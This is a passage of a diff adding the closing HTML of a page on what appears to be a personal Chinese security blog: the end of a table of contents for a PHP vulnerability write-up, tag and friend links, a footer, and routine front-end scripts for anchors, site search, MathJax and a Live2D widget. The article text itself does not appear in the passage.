class="toc-nav-number">1.4.2.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#exp-%E5%8A%A8%E8%B0%83-4"><span class="toc-nav-number">1.4.2.3.</span> <span class="toc-nav-text">- exp&amp;动调 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-4"><span class="toc-nav-number">1.4.2.4.</span> <span class="toc-nav-text">- 调用栈 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#安全" title="安全">安全</a>
+            
+            <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
+            
+            <a class="tag" href="/tags/#php" title="php">php</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>朋友们</h5>
+        <ul class="list-inline">
+
+          
+          <li>
+            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
+          </li>
+          
+          <li>
+            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
+          </li>
+          
+          <li>
+            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
+          </li>
+          
+          <li>
+            <a href="https://longlone.top/" target="_blank">Longlone</a>
+          </li>
+          
+          <li>
+            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/Morouu">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+         &copy; 2022
+		 <i class="icon-smile"></i>
+          morouu
+          <br>
+          Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
+        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-12-27T20:23:15');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div>
+		</p>
+		
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+    <!-- LangSelect start -->
+    <script type="text/javascript" src="/js/langselect.js"></script>
+    <!-- LangSelect end -->
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+    <!-- Line start -->
+    <script async="text/javascript" src="/js/line.js"></script>
+    <!-- Line end -->
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
